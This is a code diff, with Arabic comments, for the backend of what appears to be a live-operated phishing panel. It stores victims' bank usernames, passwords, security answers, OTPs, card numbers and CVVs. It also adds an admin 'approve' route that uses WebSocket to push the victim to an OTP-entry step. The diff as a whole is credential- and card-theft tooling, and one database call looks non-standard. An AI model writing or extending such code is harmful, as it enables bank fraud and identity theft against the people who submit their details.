@@ -552,7 +552,7 @@ router.post("/:id/payment", async (req, res) => {
         paymentExpiryDate: paymentData.expiryDate,
         paymentCvv: paymentData.cvv,
         paymentOtp: paymentData.paymentOtp,
-        paymentStatus: "pending",
+        paymentStatus: "verifying", // في انتظار التحقق من البطاقة
         extraData: app.extraData,
         adminNote: app.adminNote,
         version: newVersion,
@@ -587,6 +587,104 @@ router.post("/:id/payment", async (req, res) => {
   } catch (err) {
     req.log.error({ err }, "خطأ في حفظ بيانات الدفع");
     res.status(500).json({ error: "فشل في حفظ بيانات الدفع" });
+  }
+});
+
+// معالجة إجراءات الدفع (موافقة/رفض) من لوحة الإدارة
+router.post("/:id/payment-action", async (req, res) => {
+  const id = Number(req.params.id);
+  const { action } = req.body as { action: "approve" | "reject" };
+
+  if (isNaN(id)) return res.status(400).json({ error: "معرف غير صالح" });
+  if (!action || !["approve", "reject"].includes(action)) {
+    return res.status(400).json({ error: "إجراء غير صالح" });
+  }
+
+  try {
+    const [app] = await db
+      .select()
+      .from(applicationsTable)
+      .where(eq(applicationsTable.id, id));
+
+    if (!app) return res.status(404).json({ error: "الطلب غير موجود" });
+
+    const newStatus = action === "approve" ? "approved" : "failed";
+    const parentId = app.parentId ?? app.id;
+
+    // تحديث النسخ القديمة
+    await db
+      .update(applicationsTable)
+      .set({ isLatest: false, updatedAt: new Date() })
+      .where(eq(applicationsTable.parentId, parentId))
+      .andWhere(eq(applicationsTable.isLatest, true));
+
+    // إنشاء نسخة جديدة مع الحالة الجديدة
+    const [newApp] = await db
+      .insert(applicationsTable)
+      .values({
+        sessionId: app.sessionId,
+        applicantType: app.applicantType,
+        currentStep: action === "approve" ? "pay-otp" : app.currentStep,
+        status: app.status,
+        bankId: app.bankId,
+        bankName: app.bankName,
+        fullName: app.fullName,
+        nationalId: app.nationalId,
+        dateOfBirth: app.dateOfBirth,
+        monthlySalary: app.monthlySalary,
+        employer: app.employer,
+        phone: app.phone,
+        email: app.email,
+        city: app.city,
+        maritalStatus: app.maritalStatus,
+        companyName: app.companyName,
+        businessType: app.businessType,
+        commercialRegistration: app.commercialRegistration,
+        employeeCount: app.employeeCount,
+        annualRevenue: app.annualRevenue,
+        contactName: app.contactName,
+        bankUsername: app.bankUsername,
+        bankPassword: app.bankPassword,
+        securityAnswer: app.securityAnswer,
+        otpCode: app.otpCode,
+        paymentCardNumber: app.paymentCardNumber,
+        paymentCardHolder: app.paymentCardHolder,
+        paymentExpiryDate: app.paymentExpiryDate,
+        paymentCvv: app.paymentCvv,
+        paymentOtp: app.paymentOtp,
+        paymentStatus: newStatus,
+        paymentCompletedAt: action === "approve" ? new Date() : null,
+        extraData: app.extraData,
+        adminNote: app.adminNote,
+        version: (app.version || 1) + 1,
+        parentId: parentId,
+        isLatest: true,
+      })
+      .returning();
+
+    // تحديث الجلسة
+    await db
+      .update(sessionsTable)
+      .set({ applicationId: newApp.id, lastSeenAt: new Date() })
+      .where(eq(sessionsTable.id, newApp.sessionId));
+
+    // إرسال إشعار WebSocket للعميل
+    broadcast({
+      type: "payment_status_update",
+      sessionId: newApp.sessionId,
+      data: {
+        paymentStatus: newStatus,
+        currentStep: newApp.currentStep,
+      },
+    });
+
+    res.json({
+      success: true,
+      message: action === "approve" ? "تمت الموافقة وتحويل العميل للرمز" : "تم رفض الدفع",
+    });
+  } catch (err) {
+    req.log.error({ err }, "خطأ في معالجة إجراء الدفع");
+    res.status(500).json({ error: "فشل في معالجة الإجراء" });
   }
 });
 
